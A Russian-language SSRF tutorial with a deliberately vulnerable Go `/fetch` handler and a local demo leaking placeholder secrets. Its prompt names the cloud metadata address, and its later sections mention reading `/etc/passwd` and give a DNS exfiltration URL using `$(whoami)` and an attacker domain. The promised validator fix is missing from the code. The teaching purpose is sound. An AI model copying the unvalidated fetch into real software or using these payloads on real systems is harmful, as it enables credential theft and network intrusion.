# Уязвимость SSRF: Демонстрация эксплуатации внутреннего API

## Условие

Напиши эндпоинт `/fetch?url=...`, который скачивает картинку по URL и отдает клиенту. Вызови его с `url=http://localhost:8080/admin_metrics` (или `http://169.254.169.254` для AWS). Убедись, что твой сервер услужливо скачал внутренние секретные данные и отдал их хакеру.

### Исходная формулировка

**Уязвимость SSRF (Server-Side Request Forgery)**: Напиши эндпоинт `/fetch?url=...`, который скачивает картинку по URL и отдает клиенту. Вызови его с `url=http://localhost:8080/admin_metrics` (или `http://169.254.169.254` для AWS). Убедись, что твой сервер услужливо скачал внутренние секретные данные и отдал их хакеру.

## Теория

Для глубокого понимания методов защиты инженер обязан уметь воспроизводить **механику эксплуатации SSRF (Server-Side Request Forgery)**.

### Архитектура уязвимого сервиса:
- Внешний HTTP-эндпоинт: `GET /fetch?url=https://example.com/avatar.png`.
- Внутренний закрытый эндпоинт: `GET /admin_metrics` (слушает только `127.0.0.1`, закрыт файрволом от внешнего интернета и доступен только администраторам).

### Как хакер использует сервер как прокси:
1. Атакующий отправляет: `GET /fetch?url=http://127.0.0.1:8080/admin_metrics`.
2. Сервер запускает `http.Get("http://127.0.0.1:8080/admin_metrics")`.
3. Запрос исходит от имени `127.0.0.1`, поэтому внутренний эндпоинт считает его легитимным!
4. Сервер считывает конфиденциальные метрики, токены доступа или дампы кучи и возвращает их в HTTP-ответе атакующему.

## Решение по шагам

1. Создайте защищенный локальный эндпоинт `/admin/metrics` с секретными данными.
2. Создайте уязвимый эндпоинт `/fetch?url=...`, наивно скачивающий переданный URL.
3. Запустите симуляцию атаки внешним клиентом.
4. Продемонстрируйте утечку внутренних секретов.
5. Покажите, как исправить уязвимость внедрением валидатора адреса.

## Код решения

**`main.go`**

```go
package main

import (
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
)

// VulnerableFetchHandler — уязвимый обработчик скачивания URL
func VulnerableFetchHandler(w http.ResponseWriter, r *http.Request) {
	targetURL := r.URL.Query().Get("url")
	if targetURL == "" {
		http.Error(w, "missing url query parameter", http.StatusBadRequest)
		return
	}

	// УЯЗВИМОСТЬ: сервер слепо отправляет HTTP запрос по адресу клиента
	resp, err := http.Get(targetURL)
	if err != nil {
		http.Error(w, fmt.Sprintf("fetch error: %v", err), http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()

	// Копируем ответ внутреннего сервиса обратно клиенту
	w.Header().Set("Content-Type", resp.Header.Get("Content-Type"))
	w.WriteHeader(resp.StatusCode)
	_, _ = io.Copy(w, resp.Body)
}

func main() {
	mux := http.NewServeMux()

	// 1. Внутренний закрытый эндпоинт с секретами инфраструктуры
	mux.HandleFunc("/admin_metrics", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{
			"status": "SECRET_INTERNAL_METRICS",
			"aws_role_token": "ASIA_INTERNAL_SECRET_CREDENTIALS_991827",
			"active_db_connections": 450,
			"vault_master_key": "vault_s3cr3t_t0k3n"
		}`))
	})

	// 2. Внешний публичный эндпоинт загрузки
	mux.HandleFunc("/fetch", VulnerableFetchHandler)

	server := httptest.NewServer(mux)
	defer server.Close()

	fmt.Println("=== Демонстрация успешной эксплуатации SSRF ===")
	// Атакующий отправляет запрос к /fetch, передавая адрес внутреннего эндпоинта
	attackerURL := fmt.Sprintf("%s/fetch?url=%s/admin_metrics", server.URL, server.URL)
	fmt.Printf("Атакующий вызывает: %s\n\n", attackerURL)

	resp, err := http.Get(attackerURL)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	fmt.Printf("HTTP Status ответа: %d\n", resp.StatusCode)
	fmt.Println("УТЕЧКА ВНУТРЕННИХ ДАННЫХ ЧЕРЕЗ SSRF:")
	fmt.Println(string(body))
}
```

## Под капотом

Что происходит при SSRF на архитектурном уровне?
Сервер выступает в качестве **непреднамеренного открытого прокси (Confused Deputy Problem)**. Межсетевые экраны (Security Groups, iptables) разрешают входящий трафик от доверенного IP бэкенда к внутренним базам данных и эндпоинтам метрик Prometheus. Атакующий использует вычислительную мощность и доверенный сетевой контекст самого сервера для обхода сетевого периметра.

## Подводные камни

1. **Слепое проксирование заголовков ответа:** Если сервер проксирует заголовки внутреннего ответа, атакующий может получить заголовки отладки, внутренние cookie сессий и версии сервисов.
2. **Сканирование внутренних IP портов по таймингам:** Даже если сервер не возвращает тело ответа (Blind SSRF), атакующий по времени ошибки (Connection Refused за 1 мс против Connection Timeout за 10 сек) составляет полную карту портов внутренней сети.
3. **Отсутствие ограничения протоколов:** Если позволить клиенту указать схему `file:///etc/passwd`, стандартный клиент может выдать локальные файлы системы.

## На собеседовании

**Вопрос с собеседования:** Что такое Blind SSRF (Слепой SSRF) и как злоумышленник может использовать его для эксфильтрации данных, если сервер не возвращает тело ответа клиенту?
**Ответ:** При Blind SSRF сервер делает запрос, но возвращает клиенту просто `{"status": "ok"}` без тела:
1) **Эксфильтрация через DNS (Out-of-Band / OOB Data Exfiltration):** Атакующий передает URL вида:
   `http://` + `$(whoami)` + `.attacker-controlled-dns.com`.
2) Сервер пытается срезолвить имя хоста. На авторитетный DNS-сервер атакующего приходит запрос вида `root.attacker-controlled-dns.com`. Атакующий видит конфиденциальные данные в логах своих DNS-запросов!
3) Защита: полное блокирование исходящего неконтролируемого трафика через Egress Proxy и запрет произвольных DNS-запросов из пода.
